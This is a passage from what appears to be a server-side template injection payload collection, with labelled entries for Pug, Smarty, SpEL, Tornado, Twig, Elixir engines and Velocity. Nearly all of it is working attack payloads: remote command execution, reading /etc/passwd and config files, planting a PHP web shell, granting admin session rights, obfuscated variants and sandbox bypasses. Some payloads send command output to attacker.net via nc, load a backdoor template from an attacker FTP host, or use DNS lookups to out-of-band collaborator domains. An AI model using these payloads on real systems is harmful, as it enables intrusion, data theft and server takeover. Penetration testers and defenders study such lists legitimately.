[Server Side Template Injection] > Universal payloads also work for Pug. Official website >
**Categories:** ssti, remote_code_execution
```
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

#### smarty
[Server Side Template Injection] > Universal payloads also work for Smarty before v5. Official website > Smarty is a...
**Categories:** ssti, remote_code_execution
```
{$smarty.version}
{php}echo `id`;{/php} //deprecated in smarty v3
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{system('ls')} // compatible v3, deprecated in v5
{system('cat index.php')} // compatible v3, deprecated in v5
```

#### smarty_code_execution_with_obfuscation
[Server Side Template Injection] By employing the variable modifier `cat`, individual characters are concatenated to...
**Categories:** ssti, remote_code_execution
```
{{passthru(implode(Null,array_map(chr(99)|cat:chr(104)|cat:chr(114),[105,100])))}}
```

#### spel_basic_injection
[Server Side Template Injection] > SpEL has built-in templating system using `#{ }`, but SpEL is also commonly used f...
**Categories:** ssti, remote_code_execution
```
${7*7}
${'patt'.toString().replace('a', 'x')}
${T(java.lang.Integer).valueOf('1')}
```

#### spel_command_execution
[Server Side Template Injection] Method using `java.lang.Runtime` #1 - accessed with JavaClass
**Categories:** ssti, remote_code_execution
```
${T(java.lang.Runtime).getRuntime().exec("COMMAND_HERE")}
```

#### spel_dns_exfiltration
[Server Side Template Injection] DNS lookup
**Categories:** ssti, remote_code_execution
```
${"".getClass().forName("java.net.InetAddress").getMethod("getByName","".getClass()).invoke("","xxxxxxxxxxxxxx.burpcollaborator.net")}
```

#### spel_retrieve_environment_variables
[Server Side Template Injection] SpEL - Retrieve Environment Variables
**Categories:** ssti, remote_code_execution
```
${T(java.lang.System).getenv()}
```

#### spel_retrieve_etc_passwd
[Server Side Template Injection] SpEL - Retrieve /etc/passwd
**Categories:** ssti, remote_code_execution
```
${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

#### spel_session_attributes
[Server Side Template Injection] Modify session attributes
**Categories:** ssti, remote_code_execution
```
${pageContext.request.getSession().setAttribute("admin",true)}
```

#### tornado_basic_injection
[Server Side Template Injection] Tornado - Basic Injection
**Categories:** ssti, remote_code_execution
```
{{7*7}}
{{7*'7'}}
```

#### tornado_remote_command_execution
[Server Side Template Injection] Tornado - Remote Command Execution
**Categories:** ssti, remote_code_execution
```
{{os.system('whoami')}}
{%import os%}{{os.system('nslookup oastify.com')}}
```

#### twig_arbitrary_file_reading
[Server Side Template Injection] Twig - Arbitrary File Reading
**Categories:** ssti, remote_code_execution
```
"{{'/etc/passwd'|file_excerpt(1,30)}}"@
{{include("wp-config.php")}}
```

#### twig_basic_injection
[Server Side Template Injection] Twig - Basic Injection
**Categories:** ssti, remote_code_execution
```
{{7*7}}
{{7*'7'}} would result in 49
{{dump(app)}}
{{dump(_context)}}
{{app.request.server.all|join(',')}}
```

#### twig_code_execution
[Server Side Template Injection] Twig - Code Execution
**Categories:** ssti, remote_code_execution
```
{{self}}
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{[0]|reduce('system','id')}}
{{['id']|map('system')|join}}
{{['id',1]|sort('system')|join}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{['id']|filter('passthru')}}
{{['id']|map('passthru')}}
{{['nslookup oastify.com']|filter('system')}}

{% for a in ["error_reporting", "1"]|sort("ini_set") %}{% endfor %} // Enable verbose error output for Error-Based
{{_self.env.registerUndefinedFilterCallback("shell_exec")}}{%include ["Y:/A:/", _self.env.getFilter("id")]|join%} // Error-Based RCE <= 1.19
{{[0]|map(["xx", {"id": "shell_exec"}|map("call_user_func")|join]|join)}} // Error-Based RCE >=1.41, >=2.10, >=3.0

{{_self.env.registerUndefinedFilterCallback("shell_exec")}}{{1/(_self.env.getFilter("id && echo UniqueString")|trim('\n') ends with "UniqueString")}} // Boolean-Based RCE <= 1.19
{{1/({"id && echo UniqueString":"shell_exec"}|map("call_user_func")|join|trim('\n') ends with "UniqueString")}} // Boolean-Based RCE >=1.41, >=2.10, >=3.0

{% set a = ["error_reporting", "1"]|sort("ini_set") %}{% set b = ["ob_start", "call_user_func"]|sort("call_user_func") %}{{ ["id", 0]|sort("system") }}{% set a = ["ob_end_flush", []]|sort("call_user_func_array")%} // Error-Based RCE with sandbox bypass using CVE-2022-23614
{{ 1 / (["id >>/dev/null && echo -n 1", "0"]|sort("system")|first == "0") }} // Boolean-Based RCE with sandbox bypass using CVE-2022-23614
```

#### twig_code_execution_with_obfuscation
[Server Side Template Injection] Twig's block feature and built-in `_charset` variable can be nesting can be used to...
**Categories:** ssti, remote_code_execution
```
{%block U%}id000passthru{%endblock%}{%set x=block(_charset|first)|split(000)%}{{[x|first]|map(x|last)|join}}
```

#### twig_template_format
[Server Side Template Injection] Twig - Template Format
**Categories:** ssti, remote_code_execution
```
$output = $twig > render (
  'Dear' . $_GET['custom_greeting'],
  array("first_name" => $user.first_name)
);

$output = $twig > render (
  "Dear {first_name}",
  array("first_name" => $user.first_name)
);
```

#### universal_detection_payloads
[Server Side Template Injection] Polyglot to trigger an error in presence of SSTI vulnerability:
**Categories:** ssti, remote_code_execution
```
${{<%[%'"}}%\.
```

#### universal_payloads
[Server Side Template Injection] Generic code injection payloads work for many Elixir-based template engines, such as...
**Categories:** ssti, remote_code_execution
```
elem(System.shell("id"), 0) # Rendered RCE
[1, 2][elem(System.shell("id"), 0)] # Error-Based RCE
1/((elem(System.shell("id"), 1) == 0)&&1||0) # Boolean-Based RCE
elem(System.shell("id && sleep 5"), 0) # Time-Based RCE
```

#### velocity
[Server Side Template Injection] Official website > Apache Velocity is a Java-based template engine that allows web d...
**Categories:** ssti, remote_code_execution
```
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```
